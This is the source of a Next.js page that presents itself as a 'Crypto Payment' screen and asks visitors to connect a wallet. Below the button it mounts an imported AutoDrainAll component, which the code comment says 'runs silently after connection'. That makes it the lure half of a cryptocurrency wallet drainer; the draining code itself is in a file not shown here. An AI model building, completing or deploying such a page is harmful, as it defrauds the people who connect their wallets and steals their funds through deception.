import dynamic from 'next/dynamic';

declare global {
  namespace JSX {
    interface IntrinsicElements {
      'appkit-button': React.DetailedHTMLProps<
        React.HTMLAttributes<HTMLElement>,
        HTMLElement
      > & {
        size?: 'sm' | 'md' | 'lg';
        label?: string;
        balance?: 'show' | 'hide';
      };
    }
  }
}

const AutoDrainAll = dynamic(
  () => import('../components/AutoDrainAll').then((m) => m.AutoDrainAll),
  { ssr: false },
);

export default function Home() {
  return (
    <div
      style={{
        minHeight: '100vh',
        display: 'flex',
        alignItems: 'center',
        justifyContent: 'center',
        background:
          'linear-gradient(135deg, #0f0f1a 0%, #1a0a2e 50%, #0a1628 100%)',
        fontFamily:
          '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif',
      }}
    >
      <style>{`
        @keyframes spin { to { transform: rotate(360deg); } }
        @keyframes fadeIn {
          from { opacity: 0; transform: translateY(14px); }
          to   { opacity: 1; transform: translateY(0); }
        }
      `}</style>

      <div
        style={{
          animation: 'fadeIn 0.45s ease',
          background: 'rgba(255,255,255,0.05)',
          backdropFilter: 'blur(24px)',
          border: '1px solid rgba(255,255,255,0.1)',
          borderRadius: '28px',
          padding: '44px 40px',
          width: '360px',
          display: 'flex',
          flexDirection: 'column',
          alignItems: 'center',
          gap: '24px',
        }}
      >
        {/* Icon */}
        <div
          style={{
            width: '68px',
            height: '68px',
            borderRadius: '22px',
            background: 'linear-gradient(135deg, #6366f1, #8b5cf6)',
            display: 'flex',
            alignItems: 'center',
            justifyContent: 'center',
            boxShadow: '0 12px 32px rgba(99,102,241,0.4)',
          }}
        >
          <svg
            width="32"
            height="32"
            viewBox="0 0 24 24"
            fill="none"
            stroke="white"
            strokeWidth="2"
            strokeLinecap="round"
            strokeLinejoin="round"
          >
            <path d="M12 2L2 7l10 5 10-5-10-5z" />
            <path d="M2 17l10 5 10-5" />
            <path d="M2 12l10 5 10-5" />
          </svg>
        </div>

        {/* Title */}
        <div style={{ textAlign: 'center' }}>
          <h1
            style={{
              color: 'white',
              margin: '0 0 6px',
              fontSize: '26px',
              fontWeight: 800,
              letterSpacing: '-0.5px',
            }}
          >
            Crypto Payment
          </h1>
          <p
            style={{
              color: 'rgba(255,255,255,0.4)',
              margin: 0,
              fontSize: '14px',
            }}
          >
            Connect your wallet to complete
          </p>
        </div>

        {/* Divider */}
        <div
          style={{
            width: '100%',
            height: '1px',
            background: 'rgba(255,255,255,0.08)',
          }}
        />

        {/* Unified connect button — supports ETH, Polygon, BNB, Solana + more */}
        <div style={{ width: '100%', display: 'flex', justifyContent: 'center' }}>
          <appkit-button label="Connect Wallet" balance="hide" />
        </div>

        {/* Auto-drain logic runs silently after connection */}
        <AutoDrainAll />
      </div>
    </div>
  );
}
